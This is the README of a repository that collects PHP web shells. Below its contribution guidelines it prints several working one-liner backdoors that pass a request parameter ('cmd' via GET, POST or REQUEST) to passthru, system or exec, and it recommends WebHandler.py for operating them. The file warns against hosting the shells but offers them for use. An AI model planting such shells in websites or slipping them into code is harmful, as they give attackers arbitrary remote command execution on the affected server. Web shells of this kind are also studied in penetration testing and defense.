Contributing
============
To contribute other shells not listed here... Fork, Push the changes to your repo, then before you request for a Pull, make sure to include a simple description of your **php** web-shell and include a screen-shot of the web-shell (as hosted in your localhost).




php-webshells
=============

Common php webshells. Do not host the file(s) in your server!

++++++++++++++++++++++++++

Though I recommend one-liners like 

<?php echo passthru($_GET['cmd']); ?>

(Not a full fledged webshell, but works fine)

=================================================================

You can try WebHandler for one-liners.

WebHandler.py works for POST and GET requests:

    <?php system($_GET['cmd']); ?>
    <?php passthru($_REQUEST['cmd']); ?>
    <?php echo exec($_POST['cmd']); ?>


